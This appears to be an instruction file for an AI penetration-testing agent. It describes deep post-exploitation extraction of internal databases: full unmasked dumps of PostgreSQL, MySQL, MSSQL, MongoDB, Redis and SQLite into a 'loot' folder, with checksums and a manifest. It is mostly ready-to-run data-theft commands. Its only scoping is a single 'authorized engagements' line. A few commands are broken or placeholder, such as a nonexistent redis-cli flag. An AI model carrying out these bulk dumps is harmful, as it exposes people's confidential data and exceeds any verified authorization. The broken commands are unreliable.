---
name: db-extract
description: Deep extraction of an internal database after gaining access - full schema/row export per engine with checksums, streamed to /work/loot. Use instead of the masked-proofs-only style when the mission ROE asks for deep data extraction.
---
SCOPE: authorized engagements only. This is the DEEP-extraction profile: dump everything reachable with the credentials you hold, no size limiters, no masking. Masked-proof mode (see db-post-exploit) is for evidence-only missions.

## When to use
- Mission goal mentions extracting/pilfering data, listing all records, or the ROE allows full dumps (lab/CTF internal target).
- You have a working DB credential or SQL execution channel.

## Procedure (per engine)

1. **Inventory first** (read-only): engine version, current_user, privileges, databases, schemas, table list with row counts. Reconcile the dump against these counts afterwards and report any discrepancy.
2. **Export to /work/loot/<db-host>/, chmod 600**, one file per table. Compress large outputs (`zstd`/`xz` available in the image).
3. **Checksum every file** (`sha256sum`) and write a manifest with: source host:port/db, table, row count, sha256. The manifest is the deliverable of record.

### PostgreSQL (`psql` available)
```
# full schema
pg_dump -h HOST -p PORT -U USER -d DB -s -f /work/loot/schema.sql
# per table CSV (safe types, server-side copy)
psql -h HOST -p PORT -U USER -d DB -c "\copy (SELECT * FROM <schema>.<table>) TO '/work/loot/<table>.csv' WITH CSV HEADER"
# or one-shot whole-db dump (fastest when allowed):
pg_dump -h HOST -p PORT -U USER -d DB -F c -f /work/loot/db.dump
```
Non-superuser: dump only tables you can read; record `permission denied` tables in the manifest rather than stopping.

### MySQL/MariaDB
```
mysqldump -h HOST -P PORT -u USER -p'PASS' --single-transaction --routines --triggers DB > /work/loot/db.sql
# no mysqldump privileges? fall back per table:
mysql -h HOST -P PORT -u USER -p'PASS' -e "SELECT * FROM db.table" --batch > /work/loot/db.table.tsv
```

### MSSQL (mssql-cli/sqlcmd may be absent; pymssql via python3 exists)
```
python3 -c "import pymssql, csv, sys; c=pymssql.connect(...); cur=c.cursor(); cur.execute('SELECT * FROM db.dbo.table'); w=csv.writer(open('/work/loot/table.csv','w')); w.writerow([d[0] for d in cur.description]); w.writerows(cur)"
```

### MongoDB (mongosh available)
```
mongosh "mongodb://USER:PASS@HOST:PORT/DB" --quiet --eval '
  db.getCollectionNames().forEach(function(n){
    var c=db.getCollection(n); print("== "+n+" rows="+c.countDocuments({}));
    c.find().forEach(printjson);
  })' > /work/loot/mongo.jsonl
```
`mongodump` is not guaranteed present; prefer mongosh JSONL.

### Redis (redis-cli available)
```
redis-cli -h HOST -a PASS --rdb /work/loot/dump.rdb   # if replica/DEBUG sleep allowed
# or walk keys:
redis-cli -h HOST -a PASS --scan > /work/loot/keys.txt
redis-cli -h HOST -a PASS --pipe-read... # per-type DUMP for keys of interest
```

### SQLite
Plain file copy of the `.db`/`.sqlite` file into /work/loot (plus `-wal`/`-shm` if present), verify with `sqlite3 file .tables`.

## Streaming big tables
Never build a whole table in memory. Stream row-by-row (psql `\copy`, mysqldump, python csv writer). If a client lacks streaming, chunk by PK ranges:
`SELECT * FROM t WHERE id > :last ORDER BY id LIMIT 100000;`

## Time and noise
- Dumps are read-heavy but write-none; still note row counts and duration in the manifest for the report.
- Do not run duplicate full dumps: if a dump file already exists in /work/loot for that table, check its row count against the live count and only re-dump when they differ.

## Rule
Manifest + checksums + reconciled counts, or the extraction did not happen.
